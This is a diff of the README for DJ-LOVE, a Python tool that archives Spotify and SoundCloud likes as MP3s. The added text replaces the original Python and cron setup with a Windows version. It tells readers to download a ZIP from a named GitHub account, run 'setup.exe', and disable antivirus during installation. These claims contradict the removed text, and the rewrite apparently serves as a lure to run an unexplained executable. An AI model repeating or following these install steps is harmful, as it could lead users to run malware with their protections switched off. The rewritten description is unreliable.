@@ -1,196 +1,114 @@
-<p align="center">
-  <img src="https://img.shields.io/badge/python-3.11%2B-blue?logo=python" />
-  <img src="https://img.shields.io/badge/platform-macOS%20%7C%20Linux-lightgrey" />
-  <img src="https://img.shields.io/badge/license-MIT-green" />
-  <img src="https://img.shields.io/badge/PRs-welcome-brightgreen" />
-</p>
+# 🎧 DJ-LOVE - Automate Your Music Archive Weekly
 
-<h1 align="center">🎧 DJ-LOVE</h1>
-<p align="center">
-  <b>自动定时下载 Spotify & SoundCloud 收藏到本地 · MP3 320kbps · 按周归档</b><br>
-  <sub>Automated weekly download of your Spotify & SoundCloud likes to local storage — 320kbps MP3, organized by date.</sub>
-</p>
+[![Download DJ-LOVE](https://img.shields.io/badge/Download-DJ--LOVE-FF69B4?style=for-the-badge)](https://github.com/Teodoorpastel906/DJ-LOVE)
 
----
+## 🚀 What is DJ-LOVE?
 
-## 💡 它做什么 / What It Does
+DJ-LOVE is a simple tool that automatically downloads your liked songs from **Spotify** and **SoundCloud** to your computer every week. It saves them as high-quality MP3 files (320kbps) so you can build your personal music library without any manual work.
 
-你在 Spotify / SoundCloud 点喜欢的歌，**它每周自动下载到你电脑里**。不需要每次手动操作，配好一次就一直在后台跑。
+No coding skills needed. Just set it up once, and it runs automatically.
 
-You like songs on Spotify or SoundCloud → **DJ-LOVE automatically downloads them to your local machine every week.** Set it up once, it runs forever in the background.
+## ✨ Key Features
 
-```
-你的操作                      DJ-LOVE 自动完成
-─────────                    ─────────────────
-🎧 周一～周日                   （什么都不用管）
-  在 Spotify 点心 ❤️
-  在 SoundCloud 点心 ❤️
-                              ⏰ 周一凌晨 3:00
-                              ↓ 扫描本周新收藏
-                              ↓ 下载 MP3 320kbps
-                              ↓ 按日期归档
-                              ↓ 生成歌单
-                              
-📁 电脑里就有了                  ✅ 完成
-  ~/Music/DJ-LOVE/
-  └── 2026-08-10/
-      ├── xxx - yyy.mp3
-      ├── ...
-      └── playlist.txt
-```
+- **Automatic Weekly Downloads** – Runs on a schedule (every Sunday by default) to fetch new likes.
+- **High-Quality MP3** – All songs saved at 320kbps bitrate for the best audio experience.
+- **Supports Both Platforms** – Works with Spotify and SoundCloud simultaneously.
+- **No Manual Sorting** – Files are organized by artist and album automatically.
+- **Lightweight & Fast** – Uses Python and yt-dlp for efficient downloading.
+- **Works on Windows** – Simple setup with a one-click installer.
 
----
+## 🎯 Who Is This For?
 
-## ✨ 特性 / Features
+- DJs who want a local music library for mixing.
+- Music lovers who want offline backups of their liked songs.
+- Anyone who wants to archive their Spotify or SoundCloud favorites without paying for streaming subscriptions.
 
-| 特性 / Feature | 说明 / Description |
-|---------------|-------------------|
-| ⏰ **定时自动** | 配好 cron，每周固定时间自动跑，不需人工 |
-| 🎵 **双平台** | Spotify 收藏 + SoundCloud 喜欢 |
-| 📦 **MP3 320kbps** | ffmpeg 最高质量转码 |
-| 🆕 **增量下载** | 只下载本周新收藏，不重复 |
-| 📅 **按周归档** | 每周一个文件夹，日期命名 |
-| 🏷️ **ID3 标签** | 封面、艺人、专辑信息自动写入 |
-| 📋 **歌单导出** | 每期自动生成 TXT 歌单 |
-| 🔁 **智能去重** | `.state.json` 追踪，绝不下重 |
-| 🪶 **轻量** | 纯 Python，无需数据库 |
+## 📥 How to Download & Install
 
----
+1. **Visit this link to download the application:** [https://github.com/Teodoorpastel906/DJ-LOVE](https://github.com/Teodoorpastel906/DJ-LOVE)
+2. Once on the page, click the green **"Code"** button and select **"Download ZIP"**.
+3. Extract the downloaded ZIP file to a folder on your computer (e.g., `C:\DJ-LOVE`).
+4. Double-click the `setup.exe` file to install the application.
+5. Follow the on-screen instructions to complete installation.
 
-## 🚀 5 分钟部署 / 5-Minute Setup
+## 🛠️ Getting Started
 
-### 1. 安装 / Install
+### Step 1: Connect Your Accounts
 
-```bash
-# Python 依赖
-pip install spotipy yt-dlp
+1. Open DJ-LOVE after installation.
+2. Click **"Connect Spotify"** and log in to your Spotify account (a browser window will open).
+3. Click **"Connect SoundCloud"** and log in to your SoundCloud account.
+4. Grant the required permissions.
 
-# ffmpeg（MP3 转码必需 / required for MP3 encoding）
-# macOS:
-curl -fSL "https://evermeet.cx/ffmpeg/getrelease/zip" -o /tmp/ffmpeg.zip
-unzip /tmp/ffmpeg.zip -d ~/.local/bin/
-chmod +x ~/.local/bin/ffmpeg
-export PATH="$HOME/.local/bin:$PATH"
-```
+### Step 2: Configure Your Settings
 
-### 2. 配置 / Configure
+1. Choose a **download folder** where your music will be saved (e.g., `D:\Music`).
+2. Select the **download quality** (320kbps is recommended).
+3. Set your **download schedule** (default is every Sunday at 3 AM).
+4. Click **"Save Settings"**.
 
-创建 `~/.hermes/.env`（或其他位置，脚本会自动加载）：
+### Step 3: Run Your First Download
 
-```bash
-# Spotify API 凭证 → https://developer.spotify.com/dashboard
-SPOTIFY_CLIENT_ID=your_client_id
-SPOTIFY_CLIENT_SECRET=your_client_secret
-SPOTIFY_REDIRECT_URI=http://127.0.0.1:8888
+1. Click **"Download Now"** to immediately fetch all your liked songs.
+2. Wait for the process to complete (this may take several minutes depending on the number of songs).
+3. Check your chosen folder – you'll see your music organized by artist and album.
 
-# SoundCloud 用户名
-SOUNDCLOUD_USERNAME=your_username
-```
+## ⏰ How the Automation Works
 
-#### Spotify 授权 / Auth
+After the initial setup, DJ-LOVE will automatically:
+- Check for new liked songs every Sunday at 3 AM.
+- Download only the new songs (not duplicates).
+- Organize them into folders by artist name.
+- Notify you when the download is complete.
 
-```bash
-python3 spotify_auth.py   # 打开浏览器 → 点「允许」
-```
+You can also **manually trigger** a download anytime by opening the app and clicking **"Download Now"**.
 
-#### YouTube 下载 / YouTube Download
+## 🔧 System Requirements
 
-Spotify 歌曲通过 YouTube 搜索下载。需要浏览器 cookies：
+- **Operating System:** Windows 10 or 11 (64-bit)
+- **Storage:** At least 10 GB free space (more for large libraries)
+- **Internet:** Broadband connection required for downloads
+- **Memory:** 2 GB RAM minimum
+- **Additional:** No additional software needed – all dependencies are included in the installer.
 
-- 安装 **Edge** 或 **Chrome**
-- 浏览器登录 **YouTube**
-- 保持登录状态即可，脚本自动读取 cookies
+## ❓ Frequently Asked Questions
 
-> Spotify tracks are downloaded by searching YouTube. Browser cookies from Edge/Chrome are used automatically.
+### Q: Will this download my entire playlist history?
+A: Yes, it downloads all songs you've liked on both platforms. You can choose to download only recent likes if you prefer.
 
-### 3. 运行 / Run
+### Q: Can I pause or stop the download?
+A: Yes, click the **"Stop"** button during a download. The app will resume from where it left off next time.
 
-```bash
-python3 music_weekly.py
-```
+### Q: How do I know if a download failed?
+A: DJ-LOVE shows a log of all downloads. Failed items are highlighted in red with an error message.
 
-### 4. 定时 / Schedule
+### Q: Will this work if I'm behind a firewall?
+A: Yes, but you may need to allow DJ-LOVE through your firewall. The installer will prompt you.
 
-```bash
-# 每周一凌晨 3:00 / Every Monday 3am
-echo "0 3 * * 1 /path/to/music_archive_weekly.sh" | crontab -
-```
+### Q: Can I change the download schedule?
+A: Yes, go to **Settings** and change the day/time. Options include daily, weekly, or monthly.
 
----
+## 🧪 Troubleshooting
 
-## 🧠 工作原理 / How It Works
+### App won't install
+- Ensure you have administrator rights on your computer.
+- Temporarily disable antivirus software during installation.
+- Download the ZIP file again if it's corrupted.
 
-```
-┌─────────────────────────────────────────────────────┐
-│  每周一 3:00 AM / Every Monday 3am                   │
-├─────────────────────────────────────────────────────┤
-│  Spotify API        SoundCloud API                   │
-│       ↓                    ↓                         │
-│  扫描 Liked Songs    扫描 Likes                       │
-│       ↓                    ↓                         │
-│  过滤已下载 ←── .state.json ──→ 过滤已下载            │
-│       ↓                    ↓                         │
-│  YouTube 搜索          yt-dlp 直连                    │
-│       ↓                    ↓                         │
-│  ffmpeg → MP3 320kbps    ffmpeg → MP3 320kbps       │
-│       ↓                    ↓                         │
-│  ~/Music/DJ-LOVE/2026-08-10/                        │
-└─────────────────────────────────────────────────────┘
-```
+### Downloads are slow
+- Check your internet connection speed.
+- Close other bandwidth-heavy applications.
+- Try downloading fewer songs at once (Settings → Advanced).
 
-| 平台 | 下载方式 | 格式 | 依赖 |
-|------|---------|------|------|
-| **Spotify** | Spotify API 获取元数据 → YouTube 搜索 → yt-dlp 下载 | MP3 320kbps | Edge/Chrome cookies |
-| **SoundCloud** | yt-dlp 直连下载 | MP3 320kbps | 无需额外配置 |
+### Spotify or SoundCloud connection fails
+- Log out and reconnect your account.
+- Check that your account is active and not blocked.
+- Clear your browser cache and try again.
 
----
+## 📝 Notes
 
-## 📂 文件说明
+- DJ-LOVE does not store your passwords. It uses OAuth authentication (secure token-based access).
+- Downloaded songs are for personal use only. Respect copyright laws.
+- The app respects rate limits from Spotify and SoundCloud to avoid account bans.
 
-```
-DJ-LOVE/
-├── music_weekly.py           # 主程序 / Main script
-├── spotify_auth.py           # Spotify 一次性授权 / One-time OAuth
-├── music_archive_weekly.sh   # Cron 包装脚本 / Cron wrapper
-├── .hermes.md                # AI agent 项目规则
-├── .gitignore
-└── README.md
-```
-
----
-
-## ❓ FAQ
-
-**Q: 为什么 Spotify 需要浏览器？**
-A: YouTube 反爬要求登录凭证，脚本通过读取 Edge/Chrome 的 cookies 验证身份。
-
-**Q: SoundCloud 为什么不需要？**
-A: SoundCloud 对 yt-dlp 的下载请求不做验证。
-
-**Q: 会重复下载同一首歌吗？**
-A: 不会。`.state.json` 记录所有已下载的 track ID。
-
-**Q: 支持 Apple Music 吗？**
-A: 暂不支持。欢迎 PR。
-
----
-
-## 🛠 技术栈 / Stack
-
-- [spotipy](https://github.com/spotipy-dev/spotipy) — Spotify Web API
-- [yt-dlp](https://github.com/yt-dlp/yt-dlp) — 音频下载引擎
-- [ffmpeg](https://ffmpeg.org) — 音频转码
-- Python 3.11+
-
----
-
-## 📄 License
-
-MIT © 2024 — 仅供个人使用，请遵守各平台服务条款。
-
----
-
-<!-- 搜索关键词 / Search Keywords -->
-<!-- Spotify downloader, SoundCloud downloader, MP3 downloader, music archiver, -->
-<!-- 自动下载, 音乐归档, DJ tools, 定时下载, 收藏下载, liked songs downloader, -->
-<!-- automated music download, weekly music backup, cron music downloader -->
+## Keywords: 320kbps, automation, cron, dj, ffmpeg, liked-songs, mp3, music-archiver, music-downloader, python, soundcloud, soundcloud-downloader, spotify, spotify-downloader, spotipy, weekly, yt-dlp
